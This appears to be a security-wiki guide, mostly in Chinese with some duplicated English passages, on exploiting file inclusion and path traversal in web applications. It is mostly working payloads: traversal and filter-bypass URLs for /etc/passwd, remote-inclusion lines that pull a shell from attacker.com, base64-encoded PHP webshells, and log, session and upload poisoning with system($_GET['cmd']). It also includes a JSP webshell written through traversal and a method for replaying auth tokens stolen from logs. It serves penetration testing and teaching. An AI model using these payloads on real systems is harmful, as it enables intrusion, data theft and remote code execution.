# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 文件从远程服务器加载（最佳情况：你可以写入代码并由服务器执行）。在 php 中默认**禁用**（**allow_url_include**）。\
**Local File Inclusion (LFI):** 服务器加载本地文件。

当用户以某种方式可以控制将被服务器加载的文件时，就会出现该漏洞。

易受攻击的 **PHP functions**: require, require_once, include, include_once

一个用于利用此漏洞的工具: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**将多个 *nix LFI 列表混合并添加更多路径后，我创建了这个：**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

也试着将 `/` 替换为 `\`\
也试着添加 `../../../../../`

可以在 [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) 找到一个使用多种技术查找文件 /etc/password（用于检查是否存在该漏洞）的列表

### **Windows**

**合并不同的 wordlists：**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

也试着将 `/` 替换为 `\`\
也试着去掉 `C:/` 并添加 `../../../../../`

可以在 [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) 找到一个使用多种技术查找文件 /boot.ini（用于检查是否存在该漏洞）的列表

### **OS X**

查看 Linux 的 LFI 列表。

## 基本 LFI 与 绕过

所有示例适用于 Local File Inclusion，但也可用于 Remote File Inclusion（page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences 被非递归地剥离
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

绕过在提供的字符串末尾追加更多字符的限制（绕过 of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
这在 **PHP 5.4** 中已解决

### **编码**

你可以使用非标准编码，比如 double URL encode（以及其他方式）：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 来自现有文件夹

后端可能在检查文件夹路径：
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 在服务器上探索文件系统目录

可以通过特定技术递归地探索服务器的文件系统，以识别目录（不仅仅是文件）。这个过程包括确定目录深度并探测特定文件夹是否存在。下面是实现该目标的详细方法：

1. **确定目录深度：** 通过成功获取 `/etc/passwd` 文件来确定当前目录的深度（如果服务器是基于 Linux 的则适用）。下面是一个示例 URL，表示深度为三：
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **探测文件夹：** 将疑似文件夹的名称（例如 `private`）附加到 URL，然后返回到 `/etc/passwd`。额外的目录层级需要将深度增加一个：
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret the Outcomes:** 服务器的响应表明该文件夹是否存在：
- **Error / No Output:** 指定位置很可能不存在 `private` 文件夹。
- **Contents of `/etc/passwd`:** 确认存在 `private` 文件夹。
4. **Recursive Exploration:** 发现的文件夹可以使用相同的技术或传统的 Local File Inclusion (LFI) 方法进一步探测其子目录或文件。

要在文件系统的不同位置探索目录，请相应调整 payload。例如，要检查 `/var/www/` 是否包含 `private` 目录（假设当前目录深度为 3），请使用：
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation 是一种用于操纵文件路径的技术，常用于在 Web 应用程序中绕过那些在文件路径末尾追加额外字符的安全措施，从而访问受限文件。目标是构造一个文件路径，使其在被该安全措施修改后仍然指向想要的文件。

在 PHP 中，由于文件系统的特性，文件路径的多种表示形式可能被视为等价。例如：

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` 都被视为相同的路径。
- 当最后 6 个字符是 `passwd` 时，追加一个 `/`（使其变为 `passwd/`）不会改变目标文件。
- 同样，如果在文件路径后附加了 `.php`（例如 `shellcode.php`），在末尾添加 `/.` 不会改变被访问的文件。

下面的示例演示如何利用 path truncation 访问 `/etc/passwd`，这是一个常见的目标，因为它包含敏感内容（用户账号信息）：
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
在这些场景中，所需的遍历次数可能约为 2027 次，但该数字会根据服务器配置而变化。

- **Using Dot Segments and Additional Characters**: `../` 等遍历序列与额外的点段和字符结合可用于在文件系统中导航，从而有效地忽略服务器附加的字符串。
- **Determining the Required Number of Traversals**: 通过反复试验，可以找到精确的 `../` 序列数量，先导航到根目录然后到 `/etc/passwd`，确保任何附加字符串（如 `.php`）被抵消，但目标路径（`/etc/passwd`）保持不变。
- **Starting with a Fake Directory**: 通常会以一个不存在的目录（如 `a/`）开始路径。此技巧可作为预防措施或用于满足服务器路径解析逻辑的要求。

在使用 path truncation techniques 时，理解服务器的路径解析行为和文件系统结构至关重要。每种场景可能需要不同的方法，通常需要通过测试来找到最有效的手段。

**此漏洞已在 PHP 5.3 中修复。**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

在 php 中默认是禁用的，因为 **`allow_url_include`** 是 **Off.** 必须为 **On** 才能工作，这样你就可以从你的服务器包含一个 PHP 文件并获得 RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
如果出于某种原因 **`allow_url_include`** 为 **On**，但 PHP 对外部网页的访问正在被 **过滤**，[according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)，你可以例如使用 data 协议配合 base64 来解码一个 b64 PHP 代码并获得 RCE：
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 在之前的代码中，末尾的 `+.txt` 是被添加上的，因为攻击者需要一个以 `.txt` 结尾的字符串，所以字符串以此结尾，并且在 b64 decode 后，那一部分只会变成垃圾，而真实的 PHP 代码会被包含（因此被执行）。
>
> 另一个**不使用 `php://` 协议**的示例是：
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 根元素

在 python 中，对于像下面这样的代码：
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
如果用户将一个 **absolute path** 传给 **`file_name`**，则 **之前的路径会被直接移除**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
根据 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)，这是预期的行为：

> 如果某个组件是绝对路径，则会丢弃所有先前的组件，并从该绝对路径组件继续连接。

## Java 列出目录

看起来，如果在 Java 中存在 Path Traversal，并且你 **请求一个目录** 而不是文件，那么会 **返回该目录的列表**。据我所知，这在其他语言中不会发生。

## 前25个参数

以下是可能易受 local file inclusion (LFI) 漏洞影响的前25个参数列表（来自 [link](https://twitter.com/trbughunters/status/1279768631845494787）：）
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters 允许在数据被读取或写入之前执行基本的 **修改操作**。过滤器分为 5 类：

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 删除数据中的标签（位于 "<" 和 ">" 字符之间的所有内容）
- 注意此过滤器在现代 PHP 版本中已不存在
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 转换为不同的编码（`convert.iconv.<input_enc>.<output_enc>`）。要获取受支持的**所有编码列表**，在控制台运行：`iconv -l`

> [!WARNING]
> 滥用 `convert.iconv.*` 转换过滤器可以**生成任意文本**，这可能用于写入任意文本或使像 include 这样的函数处理任意文本。更多信息请查看 [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)。

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 压缩内容（在需要大量外传信息时很有用）
- `zlib.inflate`: 解压数据
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 已弃用
- `mdecrypt.*` : 已弃用
- Other Filters
- 在 PHP 中运行 `var_dump(stream_get_filters());` 可以找到一些**意外的过滤器**：
- `consumed`
- `dechunk`: 反转 HTTP chunked 编码
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" 部分不区分大小写

### 使用 php filters 作为 oracle 来读取任意文件

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) 提出了一种在服务器不返回输出的情况下读取本地文件的技术。该技术基于 **boolean exfiltration of the file (char by char) using php filters** 作为 oracle。原因在于 php filters 可用于将文本放大到足以让 php 抛出异常。

在原文中可以找到对该技术的详细解释，但这里给出快速总结：

- 使用编码器 **`UCS-4LE`** 将首字符置于开头并使字符串大小呈指数级增长。
- 这将用于生成一个在**初始字母被正确猜到时文本足够大**以致 php 会触发一个 **error**。
- **dechunk** filter 会在**第一个字符不是十六进制时删除全部内容**，因此我们可以判断第一个字符是否为十六进制。
- 这一点与前述（以及根据猜测字母使用的其他 filters）结合，可以通过观察在经过足够转换后何时使其不再是十六进制字符来猜测文本开头的字母。因为如果是 hex，dechunk 不会删除它，初始的放大会使 php 触发 error。
- 编码 **convert.iconv.UNICODE.CP930** 会将每个字母变成下一个字母（例如经过此 codec 后：a -> b）。这使我们能够判断首字母是否为 `a`，例如如果应用 6 次该 codec 则 a->b->c->d->e->f->g，该字母不再是十六进制字符，因此 dechunk 不会删除它，且由于与初始放大相乘会触发 php error。
- 通过在开头使用诸如 **rot13** 的其他变换，可以 leak 像 n、o、p、q、r 这样的字符（并且可以使用其他 codecs 将其他字母移入 hex 范围）。
- 当初始字符是数字时，需要对其进行 base64 编码并 leak 前两个字母以泄露该数字。
- 最终的问题是如何 **leak 多于初始字母的内容**。通过使用顺序内存滤镜如 **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** 可以改变字符顺序，将文本中其他字母移到首位。
- 为了能够获取 **更多数据**，思路是使用 **convert.iconv.UTF16.UTF16** 在开始处生成 2 字节的垃圾数据，应用 **UCS-4LE** 使其**与接下来的 2 字节枢轴(pivot)**，并 d**elete the data until the junk data**（这会移除初始文本的前 2 字节）。持续这样做直到到达要 leak 的目标位。

在文章中还泄露了一个可自动执行该过程的工具： [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)。

### php://fd

该 wrapper 允许访问进程已打开的文件描述符。可能有助于提取已打开文件的内容：
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
你也可以使用 **php://stdin、php://stdout 和 php://stderr** 来分别访问 **文件描述符 0、1 和 2**（不确定这在攻击中如何有用）

### zip:// and rar://

上传包含 PHPShell 的 Zip 或 Rar 文件并访问它。\
为了能够滥用 rar 协议，**必须专门启用**它。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
注意该协议受 php 配置 **`allow_url_open`** 和 **`allow_url_include`** 的限制

### expect://

Expect 必须被启用。你可以使用这个来执行代码：
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

在 POST 参数中指定您的 payload:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

当 Web 应用在文件加载时使用 `include` 等函数时，可以利用 `.phar` 文件来执行 PHP 代码。下面的 PHP 代码片段演示了如何创建一个 `.phar` 文件：
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
要编译 `.phar` 文件，应执行以下命令：
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

在执行后，会创建一个名为 `test.phar` 的文件，可能被用于利用 Local File Inclusion (LFI) 漏洞。

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

在 LFI 仅通过 `file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()` 或 `filesize()` 等函数读取文件而不执行其中 PHP 代码的情况下，可以尝试利用与使用 `phar` 协议读取文件相关的 deserialization 漏洞。

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

有关在 `.phar` 文件上下文中利用 deserialization 漏洞的详细说明，请参考下面的文档链接：

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

可以滥用 **any arbitrary file read from PHP that supports php filters** 来获得 RCE。详细描述可以在 [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1) 中找到。\
简要总结：利用了 PHP heap 中的一个 **3 byte overflow**，用来 **改变特定大小的 free chunk 链**，从而能够 **在任意地址写入任意数据**，因此加入了一个调用 **`system`** 的 hook。\
还可以通过滥用更多 php filters 来分配特定大小的 chunks。

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

### 更多协议

查看更多可能的[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**：**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 在内存或临时文件中写入（不确定这在 file inclusion attack 中如何有用）
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 访问本地文件系统
- [http://](https://www.php.net/manual/en/wrappers.http.php) — 访问 HTTP(s) URL
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — 访问 FTP(s) URL
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 压缩流
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 查找匹配模式的路径名（它不返回可打印的内容，所以在这里不是很有用）
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 音频流（不适合读取任意文件）

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

## 通过 PHP 的 'assert' 的 LFI

当使用 'assert' 函数时，PHP 中的 Local File Inclusion (LFI) 风险尤其高，因为它可以执行字符串中的代码。如果对包含类似 ".." 的 directory traversal 字符的输入进行了检查但未正确清理，就会特别有问题。

For example, PHP code might be designed to prevent directory traversal like so:

例如，PHP 代码可能被设计成如下以防止 directory traversal：
```bash
assert("strpos('$file', '..') === false") or die("");
```
虽然这旨在阻止 traversal，但它无意中为 code injection 创建了一个向量。要利用这一点来读取文件内容，攻击者可以使用：
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
类似地，为了执行任意系统命令，可以使用：
```plaintext
' and die(system("id")) or '
```
重要的是要 **URL-encode these payloads**。

## PHP Blind Path Traversal

> [!WARNING]
> 此技术适用于在你 **control** 了 **file path**，并且一个 **PHP function** 会 **access a file**，但你无法查看该文件内容（例如简单调用 **`file()`**）的情况。

在 [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) 中解释了如何利用 PHP filter 在盲路径遍历中滥用以 **exfiltrate the content of a file via an error oracle**。

概括来说，该技术使用 **"UCS-4LE" encoding** 使文件内容变得非常 **big**，从而使打开该文件的 **PHP function** 触发一个 **error**。

然后，为了泄露第一个字符，使用过滤器 **`dechunk`** 以及其他如 **base64** 或 **rot13**，最后使用过滤器 **convert.iconv.UCS-4.UCS-4LE** 和 **convert.iconv.UTF16.UTF-16BE** 来 **place other chars at the beggining and leak them**。

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

技术细节请查看上述文章！

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

当服务器端处理/上传文件的代码使用用户可控的数据（例如 filename 或 URL）构建目标路径，而没有进行规范化和校验时，`..` 段以及绝对路径可能会逃离预期目录并导致任意文件写入。如果你能将 payload 放到一个对外暴露的 web 目录下，通常通过放置 webshell 可以获得未认证的 RCE。

典型利用流程：
- 识别在某个 endpoint 或后台 worker 中的写入原语，该原语接受 path/filename 并将内容写入磁盘（例如，基于消息的 ingestion、XML/JSON 命令处理器、ZIP 解压器等）。
- 确定 web-exposed 目录。常见示例：
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 构造一个 traversal 路径，将目标存储目录跳出到 webroot，并包含你的 webshell 内容。
- 浏览已放置的 payload 并执行命令。

注意：
- 执行写操作的易受影响服务可能监听非 HTTP 端口（例如在 TCP 4004 上的 JMF XML 监听器）。主 web 门户（不同端口）随后会提供你的 payload。
- 在 Java 堆栈上，这些文件写入通常用简单的 `File`/`Paths` 拼接实现。缺乏规范化/允许列表是核心缺陷。

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
可防御此类漏洞的加固措施：
- 将路径解析为规范路径，并强制其为允许列出的基目录的子路径。
- 拒绝任何包含 `..`、绝对根路径或驱动器字母的路径；优先使用生成的文件名。
- 以低权限账户运行写入进程，并将写入目录与对外提供的根目录隔离。

## Remote File Inclusion

前面已解释，[**follow this link**](#remote-file-inclusion)。

### Via Apache/Nginx log file

如果 Apache 或 Nginx 服务器在 include 函数中**易受 LFI 攻击**，你可以尝试访问 **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**，在 **user agent** 或 **GET parameter** 中设置一个 php shell（例如 **`<?php system($_GET['c']); ?>`**）并 include 该文件

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **正确编写 payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
其他可能的日志路径:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 读取 access logs 以 获取 GET-based auth tokens (token replay)

许多应用错误地通过 GET 接受 session/auth tokens（例如 AuthenticationToken、token、sid）。如果你能通过 path traversal/LFI 原语读取 web server logs，就可以从 access logs 中窃取这些 tokens 并重放它们，从而完全绕过认证。

How-to:
- 使用 traversal/LFI 读取 web server access log。常见位置:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Some endpoints return file reads Base64-encoded. If so, decode locally and inspect the log lines.
- Grep for GET requests that include a token parameter and capture its value, then replay it against the application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
如果正文是 Base64 编码，请先解码，然后重放捕获的 token：
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
注意：
- Tokens in URLs are logged by default；在生产系统中切勿通过 GET 接受 bearer tokens。
- 如果应用支持多种 token 名称，请搜索常见键，如 AuthenticationToken、token、sid、access_token。
- 请轮换任何可能已 leaked 到日志的 tokens。

### 通过 Email

**发送邮件** 到一个内部账户 (user@localhost)，邮件包含你的 PHP payload，比如 `<?php echo system($_REQUEST["cmd"]); ?>`，并尝试使用类似 **`/var/mail/<USERNAME>`** 或 **`/var/spool/mail/<USERNAME>`** 的路径将其 include 到该用户的邮件中。

### 通过 /proc/\*/fd/\*

1. 上传大量 shells（例如：100 个）
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)，其中 $PID = 进程的 PID（可以通过 brute forced 获取），$FD 为文件描述符（也可以通过 brute forced 获取）

### 通过 /proc/self/environ

像日志文件一样，将 payload 放在 User-Agent 中发送，它会被反射到 /proc/self/environ 文件中。
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 通过上传

如果你可以上传文件，只需在其中注入 shell payload（例如：`<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
为了保持文件可读，最好将其注入到图片/文档/PDF 的元数据中

### 通过 ZIP 文件上传

上传一个包含压缩的 PHP shell 的 ZIP 文件并访问：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### 通过 PHP sessions

检查网站是否使用 PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
在 PHP 中，这些会话被存储在 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 文件中
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
将 cookie 设置为 `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
使用 LFI 包含 PHP session 文件
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### 通过 ssh

如果 ssh 已启用，检查当前使用的是哪个用户 (/proc/self/status & /etc/passwd)，并尝试访问 **\<HOME>/.ssh/id_rsa**

### **通过** **vsftpd** _**日志**_

FTP 服务器 vsftpd 的日志位于 _**/var/log/vsftpd.log**_。在存在 Local File Inclusion (LFI) 漏洞且可以访问暴露的 vsftpd 服务的场景下，可考虑以下步骤：

1. 在登录过程中，将 PHP payload 注入到用户名字段。
2. 注入后，利用 LFI 从 _**/var/log/vsftpd.log**_ 获取服务器日志。

### 通过 php base64 filter (using base64)

如 [这篇](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) 文章所示，PHP base64 filter 会忽略非 base64 字符。你可以利用这一点绕过文件扩展名检查：如果你提供的 base64 以 ".php" 结尾，它会忽略 "." 并将 "php" 附加到 base64 上。下面是一个示例 payload：
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) 解释了你可以使用 **php filters to generate arbitrary content** 作为输出。基本上这意味着你可以为 include **generate arbitrary php code**，而 **无需将其写入** 文件。

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

将一个文件 **上传**，该文件会被存储为 `/tmp` 下的临时文件，然后在 **同一请求中** 触发一个 **segmentation fault**，这样临时文件就不会被删除，你可以去查找它。

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

如果你发现了 **Local File Inclusion** 且 **Nginx** 在 PHP 前面运行，你可能可以使用下面的技术获得 RCE：

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

